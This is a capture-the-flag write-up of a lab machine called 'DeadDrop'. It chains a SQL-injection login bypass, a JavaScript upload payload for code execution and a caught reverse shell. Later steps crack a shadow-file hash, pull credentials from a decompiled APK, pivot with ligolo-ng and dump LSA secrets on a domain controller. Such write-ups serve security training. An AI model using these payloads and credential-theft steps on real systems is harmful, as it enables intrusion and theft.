## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Every dead drop points inward. Chain your findings, pivot through the gaps, and follow the trail until nothing is out of reach.
```
## Network
```bash
192.168.11.200 //accessible
```
----
#### Enumeration
- Port Scanning
```bash
Open 192.168.11.200:22
Open 192.168.11.200:80
```
- Web-Application - `Login Page`
```bash
POST /login HTTP/1.1
Host: 192.168.11.200
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.11.200
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.11.200/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
username=admin&password=admin
```
- Attempt `SQL-Injection` - `<' OR '1'='1'-->`
```bash
POST /login HTTP/1.1
Host: 192.168.11.200
Content-Length: 55
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.11.200
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.11.200/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
username=admin%27+OR+%271%27%3D%271%27--&password=admin
```
- Succeed - `js` - `upload vulnerable` - payload
```bash
module.exports = {
  cwd: process.cwd(),
  user: process.env.USER,
  home: process.env.HOME,
  node: process.version,
  uid: process.getuid(),
  gid: process.getgid()
};
```
- output
```bash
{
  "node": "v18.20.8",
  "platform": "linux"
}
```
- User Enumeration - `Payload`
```bash
module.exports = {
  cwd: process.cwd(),
  user: process.env.USER,
  home: process.env.HOME,
  node: process.version,
  uid: process.getuid(),
  gid: process.getgid()
};
```
- output
```bash
{
  "cwd": "/opt/app",
  "user": "node",
  "home": "/home/node",
  "node": "v18.20.8",
  "uid": 996,
  "gid": 996
}
```
- Environment Variables - `Payload`
```bash
module.exports = process.env;
```
- output
```bash
{
  "LANG": "C.UTF-8",
  "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin",
  "USER": "node",
  "LOGNAME": "node",
  "HOME": "/home/node",
  "INVOCATION_ID": "af6526f1f3ce45b497e641a3d0711111",
  "JOURNAL_STREAM": "8:6437",
  "SYSTEMD_EXEC_PID": "523",
  "MEMORY_PRESSURE_WATCH": "/sys/fs/cgroup/system.slice/deaddrop.service/memory.pressure",
  "MEMORY_PRESSURE_WRITE": "c29tZSAyMDAwMDAgMjAwMDAwMAA=",
  "PORT": "80",
  "NODE_ENV": "production"
}
```
- RCE
```bash
const { exec } = require('child_process');

exec(Command);
module.exports = { status: "started" };
```
- Shell Claimed
```bash
$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.40.128 • 172.18.0.1 • 172.17.0.1 • 192.168.21.19
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => tryhackme-2404 192.168.11.200 Linux-x86_64 👤 node(996) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/tryhackme-2404~192.168.11.200-Linux-x86_64/2026_08_13-18_50_35-121-node(996).log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] [New Reverse Shell] => tryhackme-2404 192.168.11.200 Linux-x86_64 👤 node(996) 😍️ Session ID <2>
node@tryhackme-2404:/opt/app$ ls
app.js	backup	db  node_modules  package-lock.json  package.json  public  uploads  views
node@tryhackme-2404:/opt/app$ cd db
node@tryhackme-2404:/opt/app/db$ ls
deaddrop.db
```
- `deaddrop.db` database explore
```bash
 cat deaddrop.db
├▒␉┌␊┤⎽␊⎼⎽┤⎽␊⎼⎽CREATE TABLE ┤⎽␊⎼⎽ (_⎽␊─┤␊┼␌␊CREATE TABLE ⎽─┌␋├␊_⎽␊─┤␊┼␌␊(┼▒└␊←⎽␊─)��
    ␋␍ INTEGER PRIMARY KEY AUTOINCREMENT←
    ┤⎽␊⎼┼▒└␊ TEXT UNIQUE NOT NULL←
    ⎻▒⎽⎽┬⎺⎼␍ TEXT NOT NULL
���!+svc-backup[password omitted]/admin[password omitted]
```
- Two Users 
```bash
svc-backup:[password omitted]
admin:[password omitted]
```
- Nothing work - Explore More  
```bash
node@tryhackme-2404:/opt/app/backup$ cat shadow.bak
svc-drop:[hash omitted]:19700:0:99999:7:::
```
- Found the Backup 
```bash
$ john svc.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[password omitted]   (svc-drop)
1g 0:00:00:12 DONE (2026-08-13 19:00) 0.07980g/s 24844p/s 24844c/s 24844C/s eliza18..destanee1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Credentials 
```bash
ssh svc-drop@192.168.11.200
Password- [password omitted]
```
- Found an another Backup Folder contain file `deaddrop-mobile.apk`
```bash
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
```
- Investigate using `jadx`
```bash
jadx -d ~/DeadDrop/apk/jadx_out ~/DeadDrop/apk/deaddrop-mobile.apk
```
- Architecture
```bash
─$ ls
AndroidManifest.xml  DebugProbesKt.bin  kotlin  META-INF  res

┌──(kali㉿kali)-[~/DeadDrop/jadx_out/resources]
└─$ cat AndroidManifest.xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="36"
    android:compileSdkVersionCodename="16"
    package="com.deaddrop.mobile"
    platformBuildVersionCode="36"
    platformBuildVersionName="16">
    <uses-sdk
        android:minSdkVersion="24"
        android:targetSdkVersion="36"/>
    <permission
        android:name="com.deaddrop.mobile.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
        android:protectionLevel="signature"/>
    <uses-permission android:name="com.deaddrop.mobile.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application
        android:theme="@style/Theme.DeadDropMobile"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:debuggable="true"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:extractNativeLibs="false"
        android:fullBackupContent="@xml/backup_rules"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
        android:dataExtractionRules="@xml/data_extraction_rules">
        <activity
            android:name="com.deaddrop.mobile.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:exported="false"
            android:authorities="com.deaddrop.mobile.androidx-startup">
            <meta-data
                android:name="androidx.emoji2.text.EmojiCompatInitializer"
                android:value="androidx.startup"/>
            <meta-data
                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
                android:value="androidx.startup"/>
            <meta-data
                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
                android:value="androidx.startup"/>
        </provider>
        <receiver
            android:name="androidx.profileinstaller.ProfileInstallReceiver"
            android:permission="android.permission.DUMP"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```
- Confirm the Apk File is an Mobile Application
- Source
```bash
─(kali㉿kali)-[~/DeadDrop/jadx_out]
└─$ ls
resources  sources

┌──(kali㉿kali)-[~/DeadDrop/jadx_out]
└─$ cd sources

┌──(kali㉿kali)-[~/DeadDrop/jadx_out/sources]
└─$ ls
android  androidx  com  kotlin  kotlinx  org

┌──(kali㉿kali)-[~/DeadDrop/jadx_out/sources]
└─$ cd com

┌──(kali㉿kali)-[~/DeadDrop/jadx_out/sources/com]
└─$ ls
deaddrop  google

┌──(kali㉿kali)-[~/DeadDrop/jadx_out/sources/com]
└─$ cd deaddrop

┌──(kali㉿kali)-[~/…/jadx_out/sources/com/deaddrop]
└─$ ls
mobile


┌──(kali㉿kali)-[~/…/jadx_out/sources/com/deaddrop]
└─$ cd mobile

┌──(kali㉿kali)-[~/…/sources/com/deaddrop/mobile]
└─$ ls
Config.java  R.java

┌──(kali㉿kali)-[~/…/sources/com/deaddrop/mobile]
└─$ cat Config.java
package com.deaddrop.mobile;

/* JADX INFO: loaded from: classes3.dex */
public final class Config {
    public static final String API_ENDPOINT = "http://internal.tryhackme.loc/api/v1";
    public static final String DEFAULT_PASSWORD = "[password omitted]";
    public static final String DEFAULT_USERNAME = "j.harris";
    public static final String ENVIRONMENT = "production";

    private Config() {
    }
}
```
- Config File - Findings
```creds
DEFAULT_USERNAME = "j.harris"
DEFAULT_PASSWORD = "[password omitted]"
```
- Discover Internal Network
```bash
ip neigh
192.168.11.34 dev ens5 FAILED
192.168.11.21 dev ens5 FAILED
192.168.11.66 dev ens5 FAILED
192.168.11.1 dev ens5 lladdr 06:8a:f2:5d:27:c7 DELAY
92.168.11.22 dev ens5 FAILED
192.168.11.2 dev ens5 lladdr 06:8a:f2:5d:27:c7 STALE
192.168.11.63 dev ens5 FAILED
192.168.11.81 dev ens5 INCOMPLETE
192.168.11.100 dev ens5 lladdr 06:98:94:e6:ac:0f STALE

ping -c 3 192.168.11.100
2 packets transmitted, 2 received, 0% packet loss, time 1033ms
rtt min/avg/max/mdev = 0.302/0.324/0.347/0.022 ms
```
- Found Another IP - `192.168.11.100` 
- Used `ligolo-ng` for pivoting
```bash
[Agent : svc-drop@tryhackme-2404] » ifcreate --name dead-drop
INFO[0297] Creating a new dead-drop interface...
INFO[0297] Interface created!
[Agent : svc-drop@tryhackme-2404] » iflist
┌──────────────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                       │
├───┬─────────────────┬───────────────────────────────────────────┬────────────────────┤
│ # │ TAP NAME        │ DST ROUTES                                │ STATE              │
├───┼─────────────────┼───────────────────────────────────────────┼────────────────────┤
│ 0 │ tun0            │ 192.168.11.0/24,192.168.21.0/24,fe80::/64 │ Active - 3 routes  │
│ 1 │ dead-drop       │                                           │                    │
│ 2 │ singularfantome │ 192.168.11.200/24                         │ Pending - 1 routes │
│ 3 │ ligolosample    │ 10.254.0.0/24,10.255.0.0/24               │ Pending - 2 routes │
└───┴─────────────────┴───────────────────────────────────────────┴────────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.
[Agent : svc-drop@tryhackme-2404] » route_add --name dead-drop --route 240.0.0.1/32
INFO[0661] Route created.
[Agent : svc-drop@tryhackme-2404] » route_add --name dead-drop --route 192.168.11.51/32
INFO[0681] Route created.
[Agent : svc-drop@tryhackme-2404] » route_add --name dead-drop --route 192.168.11.100/32
INFO[0686] Route created.
[Agent : svc-drop@tryhackme-2404] » tunnel_start --tun dead-drop
INFO[0704] Starting tunnel to svc-drop@tryhackme-2404 (06d7e6ed5fe9)
```
- Attacker machine Traffic
```bash
ping -c 3 192.168.11.100
PING 192.168.11.100 (192.168.11.100) 56(84) bytes of data.
64 bytes from 192.168.11.100: icmp_seq=1 ttl=64 time=385 ms
64 bytes from 192.168.11.100: icmp_seq=2 ttl=64 time=381 ms
64 bytes from 192.168.11.100: icmp_seq=3 ttl=64 time=376 ms

--- 192.168.11.100 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 376.409/380.559/384.738/3.400 ms
```
---
#### Enumeration 
- Target - 192.168.11.100
- Creds Claimed from Mobile Source code
```bash
PORT      STATE SERVICE       REASON         VERSION
53/tcp    open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2026-08-15 10:57:33Z)
135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: deaddrop.loc, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 64
464/tcp   open  kpasswd5?     syn-ack ttl 64
593/tcp   open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 64
3268/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: deaddrop.loc, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 64
3389/tcp  open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 64 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
```
- Domain Info
```bash
 rdp-ntlm-info:
|   Target_Name: DEADDROP
|   NetBIOS_Domain_Name: DEADDROP
|   NetBIOS_Computer_Name: DEADDROP-DC
|   DNS_Domain_Name: deaddrop.loc
|   DNS_Computer_Name: DEADDROP-DC.deaddrop.loc
|   DNS_Tree_Name: deaddrop.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-15T10:58:36+00:00
```
- NXC -Winrm
```bash
$ nxc winrm 192.168.11.100 -u "$USER" -p "$PASS"
WINRM       192.168.11.100  5985   DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 (name:DEADDROP-DC) (domain:deaddrop.loc)
WINRM       192.168.11.100  5985   DEADDROP-DC      [+] deaddrop.loc\j.harris:[password omitted] (Pwn3d!)
```
- SMBMAP
```bash
$ smbmap -H 192.168.11.100 -u "$USER" -p "$PASS"

[+] IP: 192.168.11.100:445	Name: 192.168.11.100      	Status: ADMIN!!!   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ, WRITE	Logon server share
	SYSVOL                                            	READ, WRITE	Logon server share
[*] Closed 1 connections
```
- User Status - `Admin`
- Bloodhound
```bash
─$ nxc ldap $TARGET \
-u "$USER" \
-p "$PASS" \
--users
LDAP        192.168.11.100  389    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.11.100  389    DEADDROP-DC      [+] deaddrop.loc\j.harris:[password omitted] (Pwn3d!)
LDAP        192.168.11.100  389    DEADDROP-DC      [*] Enumerated 7 domain users: deaddrop.loc
LDAP        192.168.11.100  389    DEADDROP-DC      -Username-                    -Last PW Set-       -BadPW-  -Description-         
LDAP        192.168.11.100  389    DEADDROP-DC      Administrator                 2026-05-11 02:00:45 0        Built-in account for administering the computer/domain
LDAP        192.168.11.100  389    DEADDROP-DC      Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        192.168.11.100  389    DEADDROP-DC      krbtgt                        2026-05-11 02:04:04 0        Key Distribution Center Service Account
LDAP        192.168.11.100  389    DEADDROP-DC      j.harris                      2026-05-11 02:10:21 0                              
LDAP        192.168.11.100  389    DEADDROP-DC      m.chen                        2026-05-11 02:11:09 0                              
LDAP        192.168.11.100  389    DEADDROP-DC      r.patel                       2026-05-11 02:11:10 0                              
LDAP        192.168.11.100  389    DEADDROP-DC      s.wright                      2026-05-11 02:11:10 0
```
- Look for secrets
```bash
$ nxc smb $TARGET \
-u "$USER" \
-p "$PASS" \
--lsa
SMB         192.168.11.100  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.11.100  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:[password omitted] (Pwn3d!)
SMB         192.168.11.100  445    DEADDROP-DC      [*] Dumping LSA secrets
SMB         192.168.11.100  445    DEADDROP-DC      DEADDROP\DEADDROP-DC$:aes256-cts-hmac-sha1-96:[key omitted]
SMB         192.168.11.100  445    DEADDROP-DC      DEADDROP\DEADDROP-DC$:aes128-cts-hmac-sha1-96:[key omitted]
SMB         192.168.11.100  445    DEADDROP-DC      DEADDROP\DEADDROP-DC$:des-cbc-md5:[key omitted]
SMB         192.168.11.100  445    DEADDROP-DC      DEADDROP\DEADDROP-DC$:plain_password_hex:[hex blob omitted]
SMB         192.168.11.100  445    DEADDROP-DC      DEADDROP\DEADDROP-DC$:[lmhash omitted]:[nthash omitted]:::
SMB         192.168.11.100  445    DEADDROP-DC      dpapi_machinekey:[key omitted]
dpapi_userkey:[key omitted]
SMB         192.168.11.100  445    DEADDROP-DC      [+] Dumped 6 LSA secrets to /home/kali/.nxc/logs/lsa/DEADDROP-DC_192.168.11.100_2026-08-15_071031.secrets and /home/kali/.nxc/logs/lsa/DEADDROP-DC_192.168.11.100_2026-08-15_071031.cached
```
-  Escalation
```bash
$ net rpc group addmem 'ITSUPPORT-ADMINS' 'j.harris' \
-U 'DEADDROP/j.harris%[password omitted]' \
-S '192.168.11.100'
Could not add j.harris to ITSUPPORT-ADMINS: NT_STATUS_MEMBER_IN_GROUP

┌──(kali㉿kali)-[~]
└─$ net rpc group members 'ITSUPPORT-ADMINS' \
-U 'DEADDROP/j.harris%[password omitted]' \
-S '192.168.11.100'
DEADDROP\j.harris

┌──(kali㉿kali)-[~]
└─$ net rpc group members 'DOMAIN ADMINS' \
-U 'DEADDROP/j.harris%[password omitted]' \
-S '192.168.11.100'
DEADDROP\Administrator
DEADDROP\j.harris
DEADDROP\ITSupport-Admins


evil-winrm -i DEADDROP-DC.deaddrop.loc -u j.harris -p '[password omitted]'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> more flag.txt
[flag omitted]
```
# END